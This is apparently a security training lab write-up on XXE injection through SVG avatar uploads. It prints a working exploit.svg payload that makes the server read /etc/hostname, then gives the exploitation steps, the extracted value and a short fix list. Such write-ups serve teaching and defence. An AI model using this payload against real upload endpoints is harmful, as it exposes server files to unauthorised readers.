# Lab 4: XXE via SVG File Upload
**Difficulty:** Practitioner
**Status:** ✅ Solved

## Vulnerability
Application accepts SVG image uploads for avatars.
SVG files are XML documents.
Server processes SVG with XML parser — XXE fires.

## SVG Payload (exploit.svg)

    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
    <svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
    <text x="0" y="16" font-size="16">&xxe;</text>
    </svg>

## Steps
1. Created malicious SVG with XXE payload
2. Uploaded as avatar in blog comment form
3. Server processed SVG with Apache Batik
4. Hostname rendered as TEXT inside avatar image
5. Read hostname from rendered avatar
6. Submitted hostname as lab solution

## Extracted Value
0eba565a900a

## Why It Works
SVG is XML. Image processors parse XML.
Apache Batik resolves external entities during SVG rendering.
File contents appear as rendered text in the image.

## Fix
Sanitize uploaded files.
Disable XXE in SVG processing libraries.
Never process untrusted SVG with full XML parsers.
Whitelist safe image formats only.
